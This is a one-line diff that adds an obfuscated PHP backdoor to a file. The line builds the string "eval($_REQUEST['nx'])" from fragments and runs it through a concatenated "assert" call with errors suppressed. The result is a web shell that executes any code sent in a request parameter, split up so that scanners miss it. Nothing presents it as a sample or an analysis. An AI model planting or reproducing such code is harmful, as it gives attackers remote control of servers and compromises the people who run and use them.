@@ -1,0 +1,1 @@
+<?php $xy = "ev"; $xy .= "al"; $xy .= "("; $xy .= "$"; $xy .= "_REQ"; $xy .= "UEST['nx']);"; $f="as"."sert"; @$f($xy); ?> 
